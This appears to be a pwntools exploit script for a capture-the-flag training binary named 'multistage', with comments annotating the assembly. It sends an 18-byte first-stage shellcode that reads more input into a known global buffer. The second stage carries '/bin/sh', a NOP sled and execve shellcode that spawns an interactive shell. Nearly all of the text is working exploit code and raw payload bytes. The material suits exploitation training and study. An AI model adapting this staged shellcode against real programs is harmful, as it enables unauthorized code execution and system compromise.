
from pwn import *
context.terminal =['tmux','splitw','-h']
#site = "training.jinblack.it"
#port = 3001
r = process("./multistage")
gdb.attach(r,'''b *0x0401144''')
# Our goal is to execute a shellcode in less than 20 bytes
# this opens read(stdin,buffer,0x100)
#0:  48 31 c0                xor    rax,rax <-- this is a good null or zero
#3:  48 89 c7                mov    rdi,rax <-- this time around I'm using it as a zero
#6:  be 70 40 40 00          mov    esi,0x404070 <-- then this is my buffer, please note that it is a GLOBAL VARIABLE
#b:  ba 00 01 00 00          mov    edx,0x100 <-- and this is the count
#10: 0f 05                   syscall <-- here I'll load up the /bin/sh right ?
# This is 18 bytes, but yoooo
# I'm writing 0x100 bytes, this will surely overflow that mf, and since we decide where to write
# Are overflowing up to the sEIP? NO!!! Please note that while both the rsp and the rbp are NOT modified
# if we inspect the memory of our buffer with x/100gx 0x404000 we'll notice that AFTER we have sent
# the stage_two payload the rip will continue INSIDE the buffer memory region, as such
# it is CRITICAL that we prepare a nop sled for us to land in, also optionally
# we have an easy zone in which to drop our b"/bin/sh\x00" with a known address (0x404070)
stage_one =b"\x48\x31\xC0\x48\x89\xC7\xBE\x70\x40\x40\x00\xBA\x00\x01\x00\x00\x0F\x05"
# execve(/bin/sh , null , null)
#0:  48 c7 c0 3b 00 00 00    mov    rax,0x3b <-- this is the execve code
#7:  48 c7 c7 70 40 40 00    mov    rdi,0x404070 <-- this must be a ptr to /bin/sh
#e:  48 c7 c6 78 40 40 00    mov    rsi,0x404078 <-- this contains const char *const *argv
#15: 48 89 f2                mov    rdx,rsi <-- that rsi ought to be a null ptr because I'm also loading it here
#18: 0f 05                   syscall
payload =b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x70\x40\x40\x00\x48\xC7\xC6\x78\x40\x40\x00\x48\x89\xF2\x0F\x05"

stage_two  = b"/bin/sh\x00"
stage_two += b"\x00"*8 #additional slot for terminators, please note that this shouldn't be required
stage_two += b"\x90"*20 #nop sled
stage_two += payload # execve payload, go crazy, you do not have stringent memory constraints 
input("Press key to inject stage one: ")
r.send(stage_one)

input("Press key to inject stage two: ")
r.send(stage_two)
r.interactive()
